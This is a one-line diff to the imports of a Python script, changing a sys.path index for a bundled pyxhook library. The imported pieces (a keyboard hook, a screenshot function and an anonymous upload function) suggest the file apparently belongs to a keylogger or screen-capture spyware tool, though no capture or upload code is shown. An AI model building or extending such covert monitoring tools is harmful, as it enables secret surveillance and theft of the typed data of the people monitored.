@@ -1,7 +1,7 @@
 import time
 import sys
 import subprocess
-sys.path.insert(0, './lib/pyxhook')
+sys.path.insert(1, './lib/pyxhook')
 import pyxhook
 from capture import takeScreenshot
 from anon_upload import anonymous_Upload
